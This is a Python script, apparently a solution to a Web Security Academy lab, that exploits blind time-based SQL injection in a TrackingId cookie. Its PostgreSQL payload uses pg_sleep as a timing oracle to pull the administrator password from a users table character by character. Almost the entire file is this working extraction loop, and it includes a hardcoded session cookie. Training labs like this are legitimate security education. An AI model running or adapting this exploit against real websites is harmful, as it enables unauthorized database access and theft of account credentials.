import requests
import string
import time

# Burp extension: Copy as Python request
burp0_url = "https://0a7d0078037e9c6880b21cf40028002e.web-security-academy.net:443/filter?category=Gifts"
burp0_cookies = {"TrackingId": "x", "session": "6Zi3YzUlLHF7W3VDot8A9tWQ2uZM44pE"}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"}

def password_match(password: str):
    payload = f'\' union SELECT CASE WHEN (\'{password}\'=SUBSTRING((SELECT password from users where username=\'administrator\'),1,{len(password)})) THEN (SELECT \'x\'||pg_sleep(3)) ELSE NULL END--'
    cookies = burp0_cookies.copy()
    cookies['TrackingId'] = cookies['TrackingId'] + payload

    start = time.time()
    r = requests.get(burp0_url, headers=burp0_headers, cookies=cookies)
    end = time.time()
    
    if end - start >= 3:
        return True
    return False

CHARSET = string.ascii_lowercase + string.digits + "\000"

# Potentially this could be changed to perform binary search or to make all letters requests pararell to make it faster
password = ''
found_password = False 
while not found_password:
    found_password = True
    for character in CHARSET:
        if password_match(password + character):
            password += character
            print(password)

            found_password = False
            break
    
print(f"Found password: {password}")